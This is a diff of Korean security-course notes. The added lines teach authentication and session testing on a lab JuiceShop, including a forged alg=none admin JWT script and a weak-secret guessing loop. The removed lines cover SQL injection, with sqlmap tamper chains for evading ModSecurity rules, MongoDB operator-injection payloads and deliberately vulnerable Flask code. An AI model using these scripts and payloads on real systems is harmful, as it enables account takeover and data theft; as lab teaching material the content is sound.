+**대안 — 온라인 디코더**: jwt.io 도 사용 가능하지만 **민감한 토큰을 외부 사이트에 붙여넣지 말 것** (점검 윤리 위반).
+
+### 5.3 JWT 취약점 점검
+
+**취약점 1: alg=none 공격**
+
+```bash
+# alg을 none으로 변경한 JWT 생성
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+import base64, json
+
+# Header: alg=none
+header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=').decode()
+
+# Payload: admin 권한으로 변조
+payload = base64.urlsafe_b64encode(json.dumps({
+    "status":"success",
+    "data":{"email":"admin@juice-sh.op","role":"admin"},
+    "iat":1700000000
+}).encode()).rstrip(b'=').decode()
+
+fake_token = f"{header}.{payload}."
+print(f"조작된 토큰: {fake_token[:60]}...")
+
+# 이 토큰으로 접근 시도
+import subprocess
+result = subprocess.run(
+    ["curl", "-s", "http://10.20.30.80:3000/rest/user/whoami",
+     "-H", f"Authorization: Bearer {fake_token}"],
+    capture_output=True, text=True
+)
+print(f"응답: {result.stdout[:200]}")
+PYEOF
+```
+
+**취약점 2: 약한 서명 키**
+
+```bash
+# JWT 서명 키가 약한지 확인 (흔한 키로 시도)
+# 실무에서는 jwt-cracker 같은 도구를 사용
+python3 << 'PYEOF'                                     # Python 스크립트 실행
+import hmac, hashlib, base64, json
+
+# JuiceShop에서 획득한 토큰의 header.payload 부분
+import subprocess
+r = subprocess.run(
+    ["curl", "-s", "-X", "POST", "http://10.20.30.80:3000/rest/user/login",
+     "-H", "Content-Type: application/json",
+     "-d", '{"email":"student@test.com","password":"Test1234!"}'],
+    capture_output=True, text=True
+)
+try:
+    token = json.loads(r.stdout)['authentication']['token']
+    parts = token.split('.')
+    data = f"{parts[0]}.{parts[1]}"
+    sig = parts[2]
+
+    # 흔한 시크릿 키로 서명 검증 시도
+    common_secrets = ["secret", "jwt_secret", "password", "key", "123456",
+                      "your-256-bit-secret", "change-me"]
+    for secret in common_secrets:                      # 반복문 시작
+        computed = base64.urlsafe_b64encode(
+            hmac.new(secret.encode(), data.encode(), hashlib.sha256).digest()
+        ).rstrip(b'=').decode()
+        if computed == sig:
+            print(f"[취약!] JWT 서명 키 발견: '{secret}'")
+            break
+    else:
+        print("흔한 키로는 서명 키를 찾지 못함 (양호)")
+except Exception as e:
+    print(f"테스트 실패: {e}")
+PYEOF
+```
+
+### 5.4 JWT 만료 시간 확인
+
+```bash
+TOKEN=$(curl -s -X POST http://10.20.30.80:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"student@test.com","password":"Test1234!"}' \
+  | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])" 2>/dev/null)
+
+echo "$TOKEN" | cut -d'.' -f2 | python3 -c "
+import sys, base64, json
+from datetime import datetime, timedelta
+s = sys.stdin.read().strip()
+s += '=' * (4 - len(s) % 4)
+payload = json.loads(base64.urlsafe_b64decode(s))
+if 'exp' in payload:
+    exp = datetime.fromtimestamp(payload['exp'])
+    iat = datetime.fromtimestamp(payload.get('iat', 0))
+    duration = exp - iat
+    print(f'iat (발급): {iat}')
+    print(f'exp (만료): {exp}')
+    print(f'유효 기간: {duration}')
+    print(f'평가: {\"양호 (≤1h)\" if duration <= timedelta(hours=1) else \"주의 (>1h)\" if duration <= timedelta(days=1) else \"취약 (>1d)\"}')
+else:
+    print('exp 없음 → 무한 유효 토큰 (CRITICAL)')
+"
+```
+
+**예상 출력**:
+```
+iat (발급): 2026-04-29 10:23:45
+exp (만료): 2026-04-29 16:23:45
+유효 기간: 6:00:00
+평가: 주의 (>1h)
+```
+
+> **해석 — JWT 유효 기간 정책**:
+> - **6시간** = JuiceShop 의 기본값. **운영 환경 권고: 15분~1시간 (access token) + 7일 (refresh token)**.
+> - 6시간 = *세션 탈취 시 6시간 내내 사용 가능* = high. 권고: 1시간 이내 access + refresh 토큰 분리.
+> - **exp 누락 = critical** (무한 유효). NIST SP 800-63B AAL2 = 12시간 이내, AAL3 = 30분 이내.
+> - **활용 시나리오**: 점검자가 발견한 JWT 를 24시간 후에도 재사용 가능하면 critical → exp 점검 자동화 권장.
+> - **추가 점검**: `iat` 의 timezone (UTC 표준) / `nbf` (not-before) 누락 / `jti` (JWT ID — replay 방지) 유무.
+
+---
+
+## 6. 실습 과제
+
+### 과제 1: 비밀번호 정책 점검 보고서
+1. 다양한 약한 비밀번호(1자, 숫자만, 흔한 단어 등)로 가입을 시도하라
+2. 어떤 비밀번호가 허용/거부되는지 표로 정리하라
+3. JuiceShop의 비밀번호 정책을 평가하고 개선 권고를 작성하라
+
+### 과제 2: 세션 관리 점검
+1. JWT 토큰의 유효 기간을 확인하라
+2. 로그아웃 후 토큰이 여전히 유효한지 테스트하라
+3. 다중 로그인이 가능한지 확인하라
+4. 점검 결과를 보고서 형식으로 정리하라
+
+### 과제 3: JWT 보안 분석
+1. JWT를 디코딩하여 포함된 정보를 모두 나열하라
+2. 민감 정보가 JWT에 포함되어 있는지 확인하라
+3. alg=none 공격이 통하는지 테스트하라
+
+---
+
+## 7. 요약
+
+| 점검 항목 | 확인 사항 | 도구/명령 |
+|----------|----------|----------|
+| 비밀번호 정책 | 길이, 복잡성, 사전단어 | curl + 가입 API |
+| 무차별 대입 | 계정 잠금, Rate Limiting | curl 반복 호출 |
+| 세션 만료 | 타임아웃 설정 | JWT exp 필드 |
+| 로그아웃 | 서버 측 무효화 | 토큰 재사용 테스트 |
+| JWT 보안 | alg, 서명 키 강도 | Python 디코딩 |
+
+**다음 주 예고**: Week 05 - 입력값 검증 (1): SQL Injection. Blind SQLi, Time-based, UNION 기법을 학습한다.
+
+---
+
+> **실습 환경 검증 완료** (2026-03-28): nmap/nikto, SQLi/IDOR/swagger.json, CVSS, 보고서 작성
+
+---
+
+## 웹 UI 실습
+
+### DVWA 보안 레벨 변경 방법 (웹 UI)
+
+> **DVWA URL:** `http://10.20.30.80:8080`
+
+1. 브라우저에서 `http://10.20.30.80:8080` 접속 → 로그인 (admin / password)
+2. 좌측 메뉴 **DVWA Security** 클릭
+3. **Security Level** 드롭다운에서 레벨 선택:
+   - **Low**: 세션 관리 보호 없음 → 세션 하이재킹 기본 실습
+   - **Medium**: 기본 세션 보호 → 우회 기법 실습
+   - **High**: 강화된 인증/세션 → 고급 우회 실습
+   - **Impossible**: 안전한 세션 관리 구현 참조
+4. **Submit** 클릭하여 적용
+5. **Brute Force** 메뉴에서 인증 우회 실습 수행
+6. 각 항목 페이지 하단 **View Source** 로 레벨별 인증 로직 비교
+
+---
+
+## 📂 실습 참조 파일 가이드
+
+> 이번 주 실습에서 **실제로 조작하는** 솔루션의 기능·경로·파일·설정·UI 요점입니다.
+
+### Burp Suite Community
+> **역할:** 웹 프록시 기반 수동/반자동 취약점 점검 도구  
+> **실행 위치:** `작업 PC → web (10.20.30.80:3000)`  
+> **접속/호출:** GUI `burpsuite`, CA 인증서 신뢰 필요 (`http://burp`)
+
+**주요 경로·파일**
+
+| 경로 | 역할 |
 |------|------|
-| `--batch` | 모든 prompt 자동 default (학습 환경 만) |
-| `--level=1-5` | payload *정밀도* (높을 수록 시간 + 오탐) |
-| `--risk=1-3` | DB *위험* (DROP TABLE 등 — 학습 환경 만 high) |
-| `--tamper=x,y` | 복수 tamper 의 chained |
-| `--dbms=mysql` | fingerprint 의 *hint* |
-| `--random-agent` | UA 변조 (ModSec UA 차단 우회) |
-| `--time-sec=5` | time-based 의 *delay 임계* |
-| `--threads=1-10` | 병렬 (높을 수록 빠름 + WAF 발견 가능) |
-| `--proxy=http://...` | Burp 통합 가능 |
-| `--cookie=...` | login 후 token 의 인증 |
+| `Proxy → HTTP history` | 모든 캡처된 요청/응답 |
+| `Intruder` | 페이로드 페이즈·위치 기반 자동화 |
+| `Repeater` | 단건 요청 수동 반복 |
+
+**핵심 설정·키**
+
+- `Proxy listener 127.0.0.1:8080` — 브라우저 프록시 포트
+- `Target → Scope` — in-scope 호스트만 처리
+
+**로그·확인 명령**
+
+- `Logger` — 세션 전체 요청 타임라인
+
+**UI / CLI 요점**
+
+- Ctrl+R — 요청을 Repeater로 전송
+- Ctrl+I — Intruder로 전송 후 위치(§) 설정
+- Intruder Attack type: Sniper/Cluster bomb — 단일/다중 페이로드 조합
+
+> **해석 팁.** Community 버전은 **Intruder 속도 제한**이 있어 대량 브루트포스는 비현실적. 취약점 재현과 보고서 증적 확보에 집중.
 
 ---
 
-## 2차시 — 10 tamper script + ModSec 942 우회
+## 실제 사례 (WitFoo Precinct 6 — Windows 인증 Volume Top User)
 
-### 2-1. tamper 의 *역할*
+> 출처: WitFoo Precinct 6 Cybersecurity Dataset (Apache 2.0)
+> Sanitized — RFC5737 / USER-NNNN / HOST-NNNN 으로 익명화됨.
+> 본 lecture *인증/세션 관리 점검* 학습 항목 (정상 vs 비정상 인증 패턴) 에 매핑되는 dataset 의 4624/4776 logon record 통계.
 
-sqlmap 의 *payload 변형 모듈*. *동일 의도* 의 *다른 형식* — WAF 의 *정규식* 우회.
+### Case 1: USER-0022 — 6,190 회 logon (단일 dataset 내 최다)
 
-**10 대표 tamper**:
+**dataset 내 logon 이벤트 username 빈도 (top 5)**
 
-| # | tamper | 변형 메커니즘 |
-|:-:|--------|-------------|
-| 1 | `space2comment` | space → `/**/` |
-| 2 | `space2plus` | space → `+` |
-| 3 | `space2randomblank` | space → 임의 whitespace |
-| 4 | `randomcase` | SELECT → SeLeCt |
-| 5 | `between` | `=` → `BETWEEN .. AND ..` |
-| 6 | `equaltolike` | `=` → `LIKE` |
-| 7 | `apostrophenullencode` | `'` → `%00%27` |
-| 8 | `charunicodeescape` | char → `\u00XX` |
-| 9 | `concat2concatws` | CONCAT → CONCAT_WS |
-| 10 | `unionalltounion` | UNION ALL → UNION |
+| Username | logon 횟수 | message_type 분포 |
+|----------|-----------|-------------------|
+| `USER-0022` | **6,190** | 4624 + 4776 + account_logon |
+| `USER-0012` | 4,577 | 4624 + 4776 |
+| `USER-0765` | 1,560 | 4624 |
+| `USER-0009` | 1,479 | 4624 + 4776 |
+| `USER-0023` | 1,054 | 4624 + 4776 |
 
-### 2-2. tamper 의 *chained*
+### Case 2: 4624 + 4776 (NTLM) 한 turn — 동일 사용자 NTLM auth + 즉시 logon
 
-`--tamper=space2comment,randomcase,between` 의 *동시 적용*. 한 payload 가 *3 변형*
-모두 거침.
+```text
+[T+0.000s] message_type=4776 NTLM auth (성공)
+  username=USER-0012  src_host=USER-0010-0200
+  msg=ORG-1657 ::: {"@meta":..."type":"winlogbeat","version":"8.2.2","timestamp":"2024-07-26T11:09:58.391Z"...}
 
-```sql
--- 원본
-UNION SELECT 1,2,3 FROM users--
+[T+0.000s] message_type=4776 NTLM auth (재시도)
+  username=USER-0012  src_host=USER-0010-0200
+  msg=ORG-1657 ::: {... "timestamp":"2024-07-26T11:09:58.395Z" ...}
 
--- space2comment → randomcase → between 적용
-UNION/**/SeLeCt/**/1,2,3/**/FROM/**/users--
-
--- 추가 between (= → BETWEEN)
-UNION/**/SeLeCt/**/1,2,3/**/FROM/**/USerS/**/WHERE/**/id/**/BETWEEN/**/0/**/AND/**/2--
+[T+3.262s] message_type=4776 NTLM auth (또 다시)
+  username=USER-0012  src_host=USER-0010-0206
+  msg=ORG-1657 ::: {... "timestamp":"2024-07-26T11:10:00.405Z" ...}
 ```
 
-### 2-3. ModSec CRS 942 family 의 *주요 룰*
+**해석 — 본 lecture 와의 매핑**
 
-942 family = SQLi 차단. *15+ 룰* 의 *각 패턴*.
+| 인증/세션 점검 학습 항목 | 본 record 에서의 증거 |
+|------------------------|---------------------|
+| **세션 재발급 빈도** | USER-0022 가 6,190회 logon — *Kerberos TGT 갱신 / 세션 재인증 정책* 의 합리성 점검 대상. 점검 보고서에 *고빈도 사용자 baseline* 표 포함 권장 |
+| **NTLM 사용 잔존** | message_type=4776 (NTLM) 가 4624 (Kerberos 권장) 와 함께 출현 — *legacy NTLM 비활성화 미완료* 점검 항목 |
+| **호스트 hopping** | 동일 USER-0012 가 USER-0010-0200 → 0206 으로 3.3초 사이 재인증 — *세션 fixation* / *측면이동 의심* 으로 분류 가능 |
+| **timestamp ms 정밀도** | 각 record 가 ms-level timestamp 보유 — 점검 도구가 *세션 ID 재발급 간격* 을 측정 가능 |
 
-| Rule ID | 패턴 |
-|:-------:|------|
-| 942100 | libinjection (token-based, *모든 SQLi* 의 합성) |
-| 942120 | injection 의 *동등 사용* (`=` / `<>` / `!=`) |
-| 942130 | URL encoded SQLi |
-| 942140 | common DB names (`mysql.user`, `information_schema`) |
-| 942150 | UNION SELECT |
-| 942160 | sleep / benchmark / waitfor (time-based) |
-| 942170 | SQL hex encoded |
-| 942180 | SQL injection 의 ascii encoded |
-| 942190 | MSSQL code execution + IP enumeration |
-| 942200 | ProSec custom signatures |
-| 942210 | chained SQL injection 시도 (stacked) |
-| 942220 | wide / overlong UTF-8 |
-| 942230 | MSSQL UTL_HTTP requests |
-| 942240 | DB shutdown 시도 |
-| 942250 | MATCH AGAINST / MERGE / EXECUTE IMMEDIATE |
+**점검 액션 아이템**:
+1. NTLM 4776 vs Kerberos 4624 *비율* 측정 → 5% 이상이면 legacy migration 권고
+2. 3초 내 동일 username 의 *서로 다른 src_host* 인증 → automated 로그인 또는 multi-host 세션 — 점검 보고서의 *세션 anomaly* 항목으로 등록
+3. Top user (USER-0022 6,190회) 같은 *high-volume* 계정의 자동화 여부 (서비스 계정 vs 사람 계정) 분류
 
-### 2-4. libinjection vs regex — *차이*
 
-**regex 기반** (942120, 942150 등) — *패턴 매칭*. tamper 의 *variant* 우회 가능.
 
-**libinjection** (942100) — *SQL token 의 분석*. `' OR '1'='1` 의 *token 구조* 인식
-— *변형 무관* 차단.
-
-```c
-// libinjection 의 token 분석
-input: "1' OR '1'='1"
-tokens: [NUMBER(1), STRING("'"), OPERATOR(OR), STRING("'"), NUMBER(1), OPERATOR(=), STRING("'"), NUMBER(1)]
-fingerprint: "ns&son"  // 의심 패턴
-```
-
-→ libinjection 의 *우회 어려움* — *별 의 sqlmap tamper* 가 *대부분 실패*.
-
-### 2-5. ModSec paranoia 의 *trade-off*
-
-paranoia level ↑ → SQLi 차단 ↑ + false positive ↑.
-
-| paranoia | SQLi 차단 | False Positive (정상 검색) |
-|:--------:|---------:|---------------------------:|
-| 1 (default) | 85% | < 1% |
-| 2 | 95% | 3-5% |
-| 3 | 99% | 10-20% |
-| 4 | 99.5% | 30-50% |
-
-**production** = paranoia 1 + exclusion (특정 URL 의 *false positive* 제거). paranoia
-4 = false positive 의 *모든 검색 차단* 위험.
 
 ---
 
-## 3차시 — NoSQL injection + Flask SQLAlchemy / pymongo
+## 부록: 학습 OSS 도구 매트릭스 (lab week04 — CSRF)
 
-### 3-1. NoSQL 의 *부상*
+| step | 카테고리 | 핵심 도구 |
+|---|---|---|
+| 1 csrf_detect | curl + grep / **Burp Generate CSRF PoC** / OWASP ZAP / nuclei csrf-detect / Python BS auto |
+| 2 csrf_craft form | auto-submit form / Burp PoC / **csrfgenerator.com** / pycsrf / iframe·image 변형 |
+| 3 csrf_craft GET | img/iframe/link prefetch/video/CSS bg / Burp / curl 사전 검증 |
+| 4 csrf_craft AJAX | fetch credentials:include / XHR legacy / **CORS simple request 조건** / Content-Type 우회 |
+| 5 csrf_defense SameSite | curl + grep / **SameSite 3 모드 표** / DevTools Application / Python http.server |
+| 6 csrf_bypass token | curl 8 패턴 / **Burp Sequencer entropy** / OWASP ZAP CSRF Tester |
+| 7 csrf_bypass referer | curl 빈 Referer / meta no-referrer / **substring 우회** / Burp Repeater |
+| 8 csrf_advanced JSON | curl Content-Type 4 종 / **enctype=text/plain 트릭** / Burp Active Scan / nuclei csrf,cors |
+| 9 csrf_advanced CORS | curl -H Origin 변조 / **CORScanner** / **Corsy 13 패턴** / ACAO+ACAC 분석 |
+| 10 csrf+xss chain | XSS payload + 토큰 추출 + fetch chain / **BeEF Ajax Fingerprint** / XSStrike custom / Burp Macro |
+| 11 csrf_defense double-submit | 3 단계 (cookie+header+match) / curl 검증 / __Host- prefix / **Synchronizer Token Pattern** |
+| 12 csrf_defense framework | **7 프레임워크 비교표** / curl + grep / semgrep p/csrf / npm audit |
+| 13 csrf_tool auto | Python BS / **OWASP ZAP** / Burp Active Scan / nuclei / CI/CD GitHub Actions |
+| 14 csrf_defense 권고 | **5층 방어** / Mozilla Observatory / Spring/Django/Express 설정 코드 |
+| 15 verification | 자동 보고서 / **DefectDojo** / sha256 / 윤리 footer |
 
-modern stack 의 *RDBMS 외* 사용 증가:
-- MongoDB (document) — JuiceShop / AdminConsole
-- Redis (key-value) — cache / session
-- Cassandra / DynamoDB (wide column) — big data
-- GraphQL (query language) — modern API
-
-각 *injection 패턴* 이 *SQL 과 다름*. sqlmap *비지원*.
-
-### 3-2. MongoDB injection 의 *표준 payload*
-
-MongoDB 의 *JSON query* 가 *공격 면*.
-
-**payload 1 — `$ne` (not equal)**:
-```json
-{"username": {"$ne": null}, "password": {"$ne": null}}
+### 학생 환경 준비
+```bash
+pip install corscanner
+git clone --depth 1 https://github.com/s0md3v/Corsy ~/Corsy
+# Burp Suite Community 다운로드 (CSRF PoC Generator 내장)
+# Spring Security / Django CsrfViewMiddleware / Express csurf 는 코드 통합
 ```
-*모든 user* 매칭 (null 외 = 모든 값) → 첫 user 의 *인증 통과*.
-
-**payload 2 — `$gt` / `$lt`**:
-```json
-{"username": "admin", "password": {"$gt": ""}}
-```
-*"admin" + 모든 비밀번호 (empty 외)* 매칭.
-
-**payload 3 — `$where` (JavaScript 실행)**:
-```json
-{"$where": "this.username == 'admin' || true"}
-```
-*server-side JavaScript* 실행 — RCE 가능.
-
-**payload 4 — `$regex`**:
-```json
-{"username": "admin", "password": {"$regex": ".*"}}
-```
-*정규식 매칭* — 모든 string.
-
-### 3-3. Flask 의 *2 패턴* — SQLAlchemy vs pymongo
-
-**SQLAlchemy (RDBMS, SQL)**:
-```python
-from flask_sqlalchemy import SQLAlchemy
-db = SQLAlchemy(app)
-
-# SAFE — parameterized
-user = User.query.filter_by(username=username).first()
-
-# VULN — raw SQL
-db.session.execute(f"SELECT * FROM users WHERE username='{username}'")
-```
-
-**pymongo (MongoDB)**:
-```python
-from pymongo import MongoClient
-db = MongoClient()['mydb']
-
-# SAFE — type 검증
-if not isinstance(username, str):
-    raise ValueError("username must be str")
-user = db.users.find_one({"username": username})
-
-# VULN — type 검증 없음
-user = db.users.find_one(request.json)  # {"$ne": null} 직접 전달
-```
-
-### 3-4. 방어 표준
-
-**SQL 방어**:
-1. **parameterized query** — `?` placeholder
-2. **ORM** — SQLAlchemy / Django ORM
-3. **input validation** — *type + 형식* 검증
-4. **WAF** — ModSec CRS 942
-5. **least privilege DB user** — SELECT only, DROP X
-
-**NoSQL 방어**:
-1. **type 강제** — `if not isinstance(x, str)` 사전 검증
-2. **JSON schema** — `jsonschema.validate(data, schema)`
-3. **operator whitelist** — `$ne / $gt / $where` 사용 시 *명시 적 거부*
-4. **mongo sanitize lib** — `mongoengine` 의 *clean*
-
----
-
-## 4차시 — 방어 표준 + 보고서 + W05 예고
-
-### 4-1. 한국 ISMS-P 매핑
-
-- **ISMS-P 2.6.1 (네트워크 접근)** — WAF 적용 의무
-- **ISMS-P 2.6.4 (데이터베이스 접근통제)** — DB user 의 권한 분리
-- **ISMS-P 2.7.1 (암호정책)** — DB 의 sensitive data 암호화
-- **ISMS-P 2.9.1 (보안 모니터링)** — WAF 의 audit log 보존
-
-본 W04 의 *vuln 4 영역* 가 *ISMS-P 4 통제 의 동시 위반* 가능.
-
-### 4-2. W04 보고서 의 *3 청자 만족*
-
-**임원** — vuln 의 *법 적 책임* (개인정보보호법 의 *과징금 5천만원*)
-**운영자** — *즉시 패치* (parameterized query 의 1 라인 변경)
-**분석가** — *근본 원인* (input validation 부재 + WAF 의 paranoia 1 의 한계)
-
-### 4-3. W05 예고
-
-**W05 — A03 Injection (XSS)**. JuiceShop + MediForum 의 XSS 5 변형 + ModSec 941
-+ DOM XSS.
-
-- lecture: XSS 3 종 (Stored / Reflected / DOM) + CSP + DOMPurify
-- lab 5 step: JuiceShop search XSS + MediForum 댓글 XSS + 5 변형 매트릭스 + CSP 우회 + 보고서
-
----
-
-## 4-4. R/B/P 종합 시나리오 — SQLi 의 sqlmap + ModSec 942 우회·튜닝
-
-### 통합 도식
-
-```mermaid
-graph LR
-    R["🔴 Red Team<br/>4 시도<br/>① UNION SELECT<br/>② boolean blind<br/>③ time-based blind<br/>④ tamper 우회"]
-    WEB["🌐 web Apache<br/>+ JuiceShop<br/>ModSec inline"]
-    B1["🔵 ModSec 942 family<br/>SQLi detection<br/>20+ 룰"]
-    B2["🔵 paranoia level<br/>1-4 강도"]
-    B3["🔵 anomaly score<br/>누적 → block"]
-    B4["🔵 audit log + Wazuh<br/>rule 87151 level 7"]
-    P1["🟣 Coverage Matrix<br/>4 시도 × 942 family"]
-    P2["🟣 Gap (tamper 우회)<br/>paranoia 1 의 한계"]
-    P3["🟣 룰 튜닝<br/>paranoia 2/3<br/>+ tamper-specific 룰"]
-    R --> WEB
-    WEB --> B1
-    B1 --> B2
-    B2 --> B3
-    B3 --> B4
-    B4 --> P1
-    P1 --> P2
-    P2 --> P3
-    style R fill:#f85149,color:#fff
-    style WEB fill:#3fb950,color:#fff
-    style B1 fill:#1f6feb,color:#fff
-    style B2 fill:#1f6feb,color:#fff
-    style B3 fill:#1f6feb,color:#fff
-    style B4 fill:#1f6feb,color:#fff
-    style P1 fill:#bc8cff,color:#fff
-    style P2 fill:#bc8cff,color:#fff
-    style P3 fill:#bc8cff,color:#fff
-```
-
-### Coverage Matrix — 4 sqlmap 시도 × ModSec 942 detection
-
-| 시도 | Red 명령 (sqlmap) | Blue 942 룰 매치 | Score | Paranoia 1 | Paranoia 3 | Purple 권장 |
-|------|------------------|---------------|-------|-----------|-----------|------------|
-| **① UNION** | `sqlmap -u '?id=1' --technique=U` | 942100 + 942270 | 10 | block ✓ | block ✓ | 정상 |
-| **② boolean blind** | `sqlmap -u '?id=1' --technique=B` | 942100 + 942180 | 5 | 경계 | block ✓ | paranoia 2 권장 |
-| **③ time-based** | `sqlmap -u '?id=1' --technique=T` | 942100 + 942360 (SLEEP) | 7 | block ✓ | block ✓ | 정상 |
-| **④ tamper (--tamper=randomcase)** | `sqlmap -u '?id=1' --tamper=randomcase` | 942100 (단독, 942180 미스) | 3 | 통과 ★ | block ✓ | paranoia 3 + custom rule |
-
-### 시간선 — tamper 우회 의 1 사건 흐름
-
-```
-T+0      Red attacker 의 sqlmap --tamper=randomcase
-         └→ SELECT → sElEcT 의 case 변형
-         └→ ModSec 의 정상 키워드 매치 의 일부 우회
-
-T+1ms    ModSec phase 2 처리
-         └→ 942100 (libinjection) = 약 매치, score +3
-         └→ 942180 (basic SQLi keyword) = case 변형 으로 미매치 ★
-         └→ score = 3 < paranoia 1 threshold 5 → 통과
-
-T+10s    Blue 의 audit log 의 분석 (사후)
-         └→ messages[] = ["942100"] (단독)
-         └→ score = 3, mode = "DetectionOnly" (block 안 됨)
-         └→ application 의 응답 = 정상 SQLi 결과 (vuln 노출)
-
-T+30s    Purple Gap 식별
-         └→ tamper 의 case 변형 = paranoia 1 의 한계
-         └→ paranoia 2 = 942180 의 case-insensitive 매치 활성
-
-T+5m     Purple 룰 튜닝
-         └→ /etc/modsecurity/crs-setup.conf 의 paranoia 1 → 3
-         └→ sudo systemctl reload apache2
-         └→ 재테스트 = tamper 의 case 변형 의 block 확인
-         └→ false-positive 율 의 modnel (10 분간 = 0.5%)
-
-T+15m    Purple AAR
-         └→ paranoia 3 의 적용 = tamper 의 80% block
-         └→ 나머지 20% = custom rule 의 추가 (random encoding 등)
-```
-
-### R/B/P 의 핵심 인사이트
-
-1. **sqlmap 의 5 technique 의 분리 detection** — UNION/boolean/time/error/stack 의
-   각 technique 의 특징 적 매치 룰 의 분리 분석. paranoia level 의 영향 의 정량 측정.
-
-2. **tamper 의 우회 패턴 의 분석** — randomcase/space2comment/charunicodeencode 의
-   각 tamper 의 detection 영향 의 매트릭스 작성. 운영 환경 의 paranoia level 의 결정
-   의 base.
-
-3. **paranoia level 의 점진적 ramp-up** — paranoia 1 → 2 → 3 의 점진 적용 + 10 분
-   간 의 false-positive 모니터링. 운영 안정 의 확보.
-
-4. **anomaly score 의 누적 의 의미** — 단일 룰 매치 = 약 detection / 다중 룰 매치 =
-   강 detection. score = 3 의 경계 의 추가 룰 활성 = 정확 한 block 의 결정.
-
-5. **DetectionOnly vs On 의 trade-off** — DetectionOnly = log 만 (운영 안정) / On =
-   block (운영 위험). 신규 룰 의 적용 = DetectionOnly 의 1 주 + 분석 후 On 의 전환.
-
----
-
-## 본 주차 정리
-
-본 W04 을 마치면 학생 은:
-
-1. ✅ SQLi 5 카테고리 + sqlmap 4 phase 인지
-2. ✅ 10 tamper script + ModSec 942 우회 매트릭스
-3. ✅ NoSQL injection 패턴 + Flask 의 SQLAlchemy vs pymongo
-4. ✅ parameterized query + ORM + WAF 의 3 축 방어
-5. ✅ W04 보고서 작성 + 한국 ISMS-P 매핑
-
----
-
-## 자기 점검
-
-```
-[ ] SQLi 5 카테고리 + 각 payload 예 응답?
-[ ] sqlmap 4 phase + 각 phase 의 *결과* 응답?
-[ ] 10 tamper 중 *5 대표* + 변형 메커니즘 응답?
-[ ] libinjection vs regex 의 *차이* + 우회 가능성 응답?
-[ ] NoSQL injection 의 *4 payload* + 방어 응답?
-[ ] 한국 ISMS-P 의 *4 통제* + 본 vuln 의 *위반 매핑* 응답?
-```
-
----
-
-## 다음 주차 — W05
-
-**W05 — A03 Injection (XSS 심화)**. JuiceShop + MediForum 의 XSS 5 변형 + ModSec
-941 + DOM XSS + CSP 우회.
-
-- 예상 시간: 10 시간 (lecture 3 + lab 7)
